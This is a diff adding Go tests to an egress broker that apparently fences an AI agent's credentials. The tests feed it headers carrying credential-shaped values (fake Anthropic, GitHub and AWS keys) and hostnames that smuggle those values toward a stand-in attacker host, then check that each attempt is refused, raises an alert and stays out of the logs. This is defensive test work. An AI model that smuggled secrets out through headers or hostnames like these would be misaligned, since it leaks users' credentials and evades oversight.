@@ -11,9 +11,12 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync/atomic"
 	"testing"
 	"time"
 
+	"pi-fortress/internal/alert"
+	"pi-fortress/internal/blocklist"
 	"pi-fortress/internal/httpwire"
 	"pi-fortress/internal/jsonl"
 	"pi-fortress/internal/preamble"
@@ -224,6 +227,182 @@ func TestOperationalCauseAlertsOnce(t *testing.T) {
 	}
 }
 
+// A live value in Host is attempted egress: the origin routes by that
+// name. Each one alerts, and the agent gets the one refusal. The row names
+// the SNI, not the Host, so the value does not go to the log or to the
+// webhook.
+func TestLiveValueInHostAlertsEachTime(t *testing.T) {
+	b, _ := testBroker(t)
+	b.Logs = &jsonl.Writer{StripPath: filepath.Join(t.TempDir(), "strip.jsonl")}
+	for _, sni := range []string{"pf-open-echo.test", "pf-core-echo.test"} {
+		p := preamble.Preamble{SNI: sni, OrigDst: netip.MustParseAddrPort("192.0.2.3:443")}
+		raw := "GET / HTTP/1.1\r\nHost: lab_fence_github." + sni + "\r\n\r\n"
+		for range 2 {
+			got := rawRoundtrip(t, b, p, raw)
+			if !strings.Contains(got, "503 Service Unavailable") || !strings.HasSuffix(got, RefusedBody) {
+				t.Fatalf("%s: not the one refusal: %q", sni, got)
+			}
+		}
+	}
+	body, _ := os.ReadFile(b.Logs.StripPath)
+	if strings.Contains(string(body), "lab_fence_github") {
+		t.Fatalf("the live value is in the log:\n%s", body)
+	}
+	alerts := 0
+	for _, line := range strings.Split(strings.TrimSpace(string(body)), "\n") {
+		var r jsonl.Refused
+		if err := json.Unmarshal([]byte(line), &r); err != nil {
+			t.Fatal(err)
+		}
+		if r.Cause == "live_in_host" && r.Alert && r.Slot == "a1b2c3d4e5f67890" && r.Host == r.SNI {
+			alerts++
+		}
+	}
+	if alerts != 4 {
+		t.Fatalf("%d alerts, want 4:\n%s", alerts, body)
+	}
+}
+
+// The broker decides on a WebSocket from Connection and Upgrade before the
+// fence runs. A live value there refuses the request, also a kind that the
+// host injects, and each one alerts. Nothing goes to the origin, and no
+// row or alert text carries the live value.
+func TestLiveValueInConnectionAlertsEachTime(t *testing.T) {
+	b, _ := testBroker(t)
+	dir := t.TempDir()
+	b.Logs = &jsonl.Writer{StripPath: filepath.Join(dir, "strip.jsonl"), UnknownPath: filepath.Join(dir, "unknown.jsonl")}
+	// The broker may dial ahead (predial). The origin must get no request.
+	var got atomic.Bool
+	wsUpstream(t, b, func(*httpwire.Request, net.Conn, *bufio.Reader) { got.Store(true) })
+	oat := "sk-ant-oat01-" + strings.Repeat("A", 64)
+	ghp := "ghp_" + strings.Repeat("A", 36)
+	ws := "Upgrade: websocket\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n"
+	for _, tc := range []struct{ fields, want string }{
+		{"Connection: lab_fence_github\r\n", RefusedBody},
+		{ws + "Connection: Upgrade, " + oat + "\r\n", RefusedBody},
+		{"Connection: keep-alive, " + ghp + "\r\n", RefusedBody},
+		// TestLiveValueInRefusedUpgradeAlerts has the 501 of an Upgrade
+		// other than websocket.
+	} {
+		got := rawRoundtrip(t, b, anthropic, "GET /socket HTTP/1.1\r\nHost: api.anthropic.com\r\n"+tc.fields+"\r\n")
+		if !strings.HasSuffix(got, tc.want) {
+			t.Fatalf("%q: not the refusal: %q", tc.fields, got)
+		}
+	}
+	time.Sleep(20 * time.Millisecond)
+	if got.Load() {
+		t.Fatal("a refused request reached the origin")
+	}
+	strip, _ := os.ReadFile(b.Logs.StripPath)
+	unknown, _ := os.ReadFile(b.Logs.UnknownPath)
+	all := string(strip) + string(unknown)
+	for _, live := range []string{"lab_fence_github", oat, ghp} {
+		if strings.Contains(all, live) {
+			t.Fatalf("the live value is in a row:\n%s", all)
+		}
+	}
+	slots := map[string]bool{}
+	for _, line := range strings.Split(strings.TrimSpace(all), "\n") {
+		var m map[string]any
+		if err := json.Unmarshal([]byte(line), &m); err != nil {
+			t.Fatalf("row %q: %v", line, err)
+		}
+		if msg := alert.Summarize(m); strings.Contains(msg, "lab_fence_github") || strings.Contains(msg, "sk-ant-") || strings.Contains(msg, "ghp_") {
+			t.Fatalf("the live value is in the alert %q", msg)
+		}
+		if m["cause"] != "live_in_connection" {
+			continue
+		}
+		if m["alert"] != true || m["where"] != "header:Connection" {
+			t.Fatalf("row %s", line)
+		}
+		slot, _ := m["slot"].(string)
+		slots[slot] = true
+	}
+	for _, slot := range []string{"a1b2c3d4e5f67890", "b0b1b2b3b4b5b6b7", ""} {
+		if !slots[slot] {
+			t.Fatalf("no live_in_connection alert for slot %q:\n%s", slot, all)
+		}
+	}
+}
+
+// The broker answers each Upgrade other than websocket with 501 before the
+// fence runs. A live value in that Upgrade or Connection writes the same
+// live_in_connection row as the fence path, and it alerts. A plain refused
+// Upgrade writes no row.
+func TestLiveValueInRefusedUpgradeAlerts(t *testing.T) {
+	b, _ := testBroker(t)
+	dir := t.TempDir()
+	b.Logs = &jsonl.Writer{StripPath: filepath.Join(dir, "strip.jsonl"), UnknownPath: filepath.Join(dir, "unknown.jsonl")}
+	ghp := "ghp_" + strings.Repeat("A", 36)
+	for _, fields := range []string{
+		"Upgrade: h2c\r\nConnection: Upgrade\r\n",
+		"Upgrade: lab_fence_github\r\nConnection: Upgrade\r\n",
+		"Upgrade: h2c, " + ghp + "\r\nConnection: Upgrade\r\n",
+	} {
+		got := rawRoundtrip(t, b, anthropic, "GET /socket HTTP/1.1\r\nHost: api.anthropic.com\r\n"+fields+"\r\n")
+		if !strings.Contains(got, "501 Not Implemented") || !strings.HasSuffix(got, "upgrade\n") {
+			t.Fatalf("%q: not the 501: %q", fields, got)
+		}
+	}
+	strip, _ := os.ReadFile(b.Logs.StripPath)
+	unknown, _ := os.ReadFile(b.Logs.UnknownPath)
+	all := strings.TrimSpace(string(strip) + string(unknown))
+	if strings.Contains(all, "lab_fence_github") || strings.Contains(all, ghp) {
+		t.Fatalf("the live value is in a row:\n%s", all)
+	}
+	slots := map[string]bool{}
+	for _, line := range strings.Split(all, "\n") {
+		var m map[string]any
+		if err := json.Unmarshal([]byte(line), &m); err != nil {
+			t.Fatalf("row %q: %v", line, err)
+		}
+		if m["cause"] != "live_in_connection" || m["alert"] != true || m["where"] != "header:Upgrade" {
+			t.Fatalf("row %s", line)
+		}
+		slot, _ := m["slot"].(string)
+		slots[slot] = true
+	}
+	if len(slots) != 2 || !slots["a1b2c3d4e5f67890"] || !slots[""] {
+		t.Fatalf("slots %v:\n%s", slots, all)
+	}
+}
+
+// A repeated credential header is an attempt to make the origin read a
+// value that the fence did not decide on. Each one alerts, the agent gets
+// the one refusal, and the origin gets no request.
+func TestRepeatedCredentialHeaderAlertsEachTime(t *testing.T) {
+	b, _ := testBroker(t)
+	b.Logs = &jsonl.Writer{StripPath: filepath.Join(t.TempDir(), "strip.jsonl")}
+	var got atomic.Bool
+	rawUpstream(t, b, func(int, *httpwire.Request, net.Conn) bool { got.Store(true); return false })
+	raw := "GET / HTTP/1.1\r\nHost: api.anthropic.com\r\nX-Api-Key: a\r\nx-api-key: b\r\n\r\n"
+	for range 3 {
+		resp := rawRoundtrip(t, b, anthropic, raw)
+		if !strings.Contains(resp, "503 Service Unavailable") || !strings.HasSuffix(resp, RefusedBody) {
+			t.Fatalf("not the one refusal: %q", resp)
+		}
+	}
+	time.Sleep(20 * time.Millisecond)
+	if got.Load() {
+		t.Fatal("a refused request reached the origin")
+	}
+	body, _ := os.ReadFile(b.Logs.StripPath)
+	alerts := 0
+	for _, line := range strings.Split(strings.TrimSpace(string(body)), "\n") {
+		var r jsonl.Refused
+		if err := json.Unmarshal([]byte(line), &r); err != nil {
+			t.Fatal(err)
+		}
+		if r.Cause == "repeated_credential_header" && r.Alert && r.Where == "header:x-api-key" {
+			alerts++
+		}
+	}
+	if alerts != 3 {
+		t.Fatalf("%d alerts, want 3:\n%s", alerts, body)
+	}
+}
+
 // A key in a field name is attempted egress, like a placeholder aimed at a
 // wrong host. Each one alerts, and the agent gets the one refusal.
 func TestKeyInHeaderNameAlertsEachTime(t *testing.T) {
@@ -250,5 +429,69 @@ func TestKeyInHeaderNameAlertsEachTime(t *testing.T) {
 	}
 	if alerts != 3 {
 		t.Fatalf("%d alerts, want 3:\n%s", alerts, body)
+	}
+}
+
+// The broker writes some rows before the fence runs: the target rules,
+// the blocklist, the paranoid deny and a refused git push. A Host that
+// holds a live value or a token-prefix match must not go into these rows
+// either, because the alerter posts the host of a strip row to the
+// webhook. The row names the SNI instead.
+func TestLiveValueInHostStaysOutOfEarlyRows(t *testing.T) {
+	akia := "AKIA" + strings.Repeat("Q", 16)
+	for _, tc := range []struct {
+		name, sni, host, dst, target, live, want, where string
+		setup                                           func(*Broker)
+	}{
+		{name: "bad host", sni: "evil.example", host: "lab_fence_github@evil.example", live: "lab_fence_github", want: "evil.example", where: "target"},
+		{name: "port mismatch", sni: "evil.example", host: akia + ".evil.example:8443", live: akia, want: "evil.example", where: "target"},
+		{name: "blocklist", sni: "ok.example", host: akia + ".blocked.example", live: akia, want: "ok.example", where: "host",
+			setup: func(b *Broker) { b.Blocked = blocklist.New("blocked.example") }},
+		{name: "git push", sni: "github.com", host: akia + ".github.com", target: "/o/x.git/info/refs?service=git-receive-pack", live: akia, want: "github.com", where: "target",
+			setup: func(b *Broker) { b.GitPush = gitPushList(t, "github.com o/r\n") }},
+		{name: "paranoid", sni: "github.com", host: akia + ".evil.example", live: akia, want: "github.com", where: whereParanoid,
+			setup: func(b *Broker) {
+				pb := paranoidBroker(t)
+				b.Paranoid, b.Forward = pb.Paranoid, pb.Forward
+			}},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			b, _ := testBroker(t)
+			dir := t.TempDir()
+			b.Logs = &jsonl.Writer{StripPath: filepath.Join(dir, "strip.jsonl"), UnknownPath: filepath.Join(dir, "unknown.jsonl")}
+			var dialed atomic.Bool
+			b.DialTLS = noDial(&dialed)
+			if tc.setup != nil {
+				tc.setup(b)
+			}
+			target := tc.target
+			if target == "" {
+				target = "/"
+			}
+			p := preamble.Preamble{SNI: tc.sni, OrigDst: netip.MustParseAddrPort("8.8.8.8:443")}
+			_ = rawRoundtrip(t, b, p, "GET "+target+" HTTP/1.1\r\nHost: "+tc.host+"\r\n\r\n")
+			strip, _ := os.ReadFile(b.Logs.StripPath)
+			unknown, _ := os.ReadFile(b.Logs.UnknownPath)
+			all := string(strip) + string(unknown)
+			if strings.Contains(strings.ToLower(all), strings.ToLower(tc.live)) {
+				t.Fatalf("the live value is in a row:\n%s", all)
+			}
+			found := false
+			for _, line := range strings.Split(strings.TrimSpace(all), "\n") {
+				var m map[string]any
+				if err := json.Unmarshal([]byte(line), &m); err != nil {
+					t.Fatalf("row %q: %v", line, err)
+				}
+				if msg := alert.Summarize(m); strings.Contains(strings.ToLower(msg), strings.ToLower(tc.live)) {
+					t.Fatalf("the live value is in the alert %q", msg)
+				}
+				if m["where"] == tc.where && m["host"] == tc.want {
+					found = true
+				}
+			}
+			if !found {
+				t.Fatalf("no %s row with host %q:\n%s", tc.where, tc.want, all)
+			}
+		})
 	}
 }
